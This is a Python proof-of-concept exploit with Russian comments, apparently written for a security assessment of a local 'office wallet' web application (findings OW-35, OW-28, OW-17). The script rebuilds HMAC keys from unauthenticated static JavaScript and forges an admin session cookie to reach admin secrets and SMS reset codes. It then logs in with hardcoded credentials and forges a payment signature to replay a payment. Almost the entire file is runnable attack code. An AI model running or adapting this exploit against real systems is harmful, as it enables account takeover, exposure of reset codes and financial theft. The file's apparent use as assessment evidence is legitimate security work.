#!/usr/bin/env python3
"""
01 — подделка сессии и платёжной подписи (OW-35, OW-28, OW-17).

Ключи собираются из статики, которая отдаётся без авторизации:
  app/static/wallet.js       keyParts = ["office","-","wallet"]
  app/static/legacy-sync.js  __SK_TAIL__ = ["-","session","-","key"]
  -> SESSION_KEY  = "office-wallet-session-key"
  app/static/pay.js          parts = ["office","-","wallet","-","pay","-","key"]
  -> PAYMENT_KEY  = "office-wallet-pay-key"

Роль лежит внутри подписываемой строки uid:role и после проверки HMAC
принимается сервером как есть (internal/app/auth.go:40-43), поэтому
подпись с role=admin даёт админку.

Использование:
  python3 01_forged_session_and_payment.py [BASE_URL]
  python3 01_forged_session_and_payment.py [BASE_URL] replay OP AMOUNT TO
"""
import hashlib
import hmac
import http.cookiejar
import sys
import urllib.parse
import urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:18081"

SESSION_KEY = "office-wallet-session-key"   # wallet.js + legacy-sync.js
PAYMENT_KEY = "office-wallet-pay-key"       # pay.js


def sign(key: str, msg: str) -> str:
    return hmac.new(key.encode(), msg.encode(), hashlib.sha256).hexdigest()


def make_cookie(uid: int, role: str) -> str:
    """Формат: ow.<uid>.<role>.<hmac>, hmac = HMAC(SESSION_KEY, "<uid>:<role>")."""
    return "ow.%d.%s.%s" % (uid, role, sign(SESSION_KEY, "%d:%s" % (uid, role)))


def get(url: str, cookie: str) -> tuple[int, str]:
    req = urllib.request.Request(url, headers={"Cookie": "ow_session=" + cookie})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def post(url: str, data: dict, cookie: str) -> tuple[int, str]:
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=body, headers={"Cookie": "ow_session=" + cookie})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def demo_session() -> None:
    print("== 1. OW-35/OW-28: подделка сессии с ролью admin ==")
    cookie = make_cookie(6, "admin")
    print("SESSION_KEY =", SESSION_KEY)
    print("cookie      =", cookie)

    code, body = get(BASE + "/admin/secrets", cookie)
    who = "Админ Кошелька" if "Админ Кошелька" in body else "нет"
    print("GET /admin/secrets  -> HTTP %d, в шапке: %s" % (code, who))

    code, body = get(BASE + "/gateway/sms", cookie)
    print("GET /gateway/sms    -> HTTP %d%s" % (
        code, ", коды сброса видны: " + ("да" if "код подтверждения" in body or "SMS" in body else "нет")))

    code, body = get(BASE + "/", cookie)
    print("GET /               -> HTTP %d, роль в шапке: %s" % (
        code, "Администратор" if "Администратор" in body else "иначе"))


def demo_payment_replay(op: int, amount: int, recipient: int, to_login: str) -> None:
    print("\n== 2. OW-17: подделка платёжной подписи и повтор платежа ==")
    # сначала обычный вход, чтобы была валидная сессия
    login = urllib.parse.urlencode(
        {"login": "ivanov", "password": "workplace1", "return": "/"}).encode()
    jar = http.cookiejar.CookieJar()
    op_ = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    op_.open(urllib.request.Request(BASE + "/login", data=login), timeout=10)
    sess = None
    for c in jar:
        if c.name == "ow_session":
            sess = c.value
    if not sess:
        print("не удалось войти как ivanov/workplace1")
        return

    sig = sign(PAYMENT_KEY, "%d:%d:%d" % (op, amount, recipient))
    print("PAYMENT_KEY =", PAYMENT_KEY)
    print("подпись     =", sig)

    def balance() -> str:
        _, page = get(BASE + "/", sess)
        for line in page.splitlines():
            if "who-meta" in line:
                return line.split("·")[-1].strip()
        return "?"

    before = balance()
    print("баланс до  :", before)
    data = {"op_id": op, "amount_kop": amount, "recipient": recipient, "sig": sig}
    if to_login:
        data["to_login"] = to_login
    code, _ = post(BASE + "/pay/replay", data, sess)
    after = balance()
    print("POST /pay/replay -> HTTP %d (urllib идёт за редиректом)" % code)
    print("баланс после:", after)
    print("деньги ушли повторно, если балансы разные" if before != after
          else "баланс не изменился — подпись не сошлась")


if __name__ == "__main__":
    demo_session()
    if len(sys.argv) >= 6 and sys.argv[2] == "replay":
        demo_payment_replay(int(sys.argv[3]), int(sys.argv[4]), int(sys.argv[5]),
                            sys.argv[6] if len(sys.argv) > 6 else "")
    else:
        demo_payment_replay(2, 300, 3, "")
